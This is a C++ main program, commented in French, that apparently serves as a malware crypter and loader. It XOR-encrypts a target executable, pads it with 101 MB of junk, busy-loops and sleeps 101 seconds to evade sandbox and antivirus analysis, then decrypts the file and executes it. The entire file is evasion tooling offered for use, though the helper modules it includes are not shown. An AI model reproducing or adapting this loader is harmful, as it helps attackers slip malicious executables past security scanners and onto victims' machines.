#include <iostream>
#include <string>

#include "./counter/counter.h"
#include "./file_augmenter/file_augmenter.h"
#include "./file_encryptor/file_encryptor.h"
#include "./file_manager/file_manager.h"
#include "./timer/timer.h"

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <fichier_cible>" << std::endl;
        return 1;
    }

    // Chemins des fichiers
    std::string inputFile = argv[1];
    std::string encryptedFile = "encrypted.bin";
    std::string decryptedFile = "decrypted_temp.exe";

    // 1. Chiffrement du fichier cible
    std::cout << "[*] Chiffrement du fichier: " << inputFile << std::endl;
    FileEncryptor encryptor(0xAA);
    if (!encryptor.processFile(inputFile, encryptedFile)) {
        std::cerr << "Erreur lors du chiffrement." << std::endl;
        return 1;
    }
    std::cout << "[+] Fichier chiffré généré: " << encryptedFile << std::endl;

    // 2. Ajout de 101 MB de données junk
    const size_t extraBytes = 101 * 1024 * 1024;  // 101 MB
    std::cout << "[*] Ajout de " << extraBytes
              << " octets de données junk au fichier chiffré." << std::endl;
    FileAugmenter augmenter;
    if (!augmenter.appendJunkData(encryptedFile, extraBytes)) {
        std::cerr << "Erreur lors de l'ajout des données junk." << std::endl;
        return 1;
    }
    std::cout << "[+] Données ajoutées avec succès." << std::endl;

    // 3. Incrémentation du compteur jusqu'à 100001
    std::cout << "[*] Incrémentation du compteur jusqu'à 100001." << std::endl;
    Counter counter;
    counter.run(100001);
    std::cout << "[+] Compteur atteint: " << counter.getValue() << std::endl;

    // 4. Pause de 101 secondes et vérification du temps écoulé
    std::cout << "[*] Pause de 101 secondes..." << std::endl;
    Timer timer;
    double elapsed = timer.sleepForSeconds(101);
    std::cout << "[+] Temps écoulé: " << elapsed << " secondes." << std::endl;
    if (elapsed < 101) {
        std::cerr << "Erreur: 101 secondes n'ont pas été atteintes."
                  << std::endl;
        return 1;
    }

    // 5. Déchiffrement et exécution du fichier
    std::cout << "[*] Déchiffrement et exécution du fichier déchiffré."
              << std::endl;
    FileManager manager(0xAA);
    if (!manager.decryptAndExecute(encryptedFile, decryptedFile)) {
        std::cerr << "Erreur lors du déchiffrement ou de l'exécution."
                  << std::endl;
        return 1;
    }

    std::cout << "[+] Processus terminé avec succès." << std::endl;
    return 0;
}

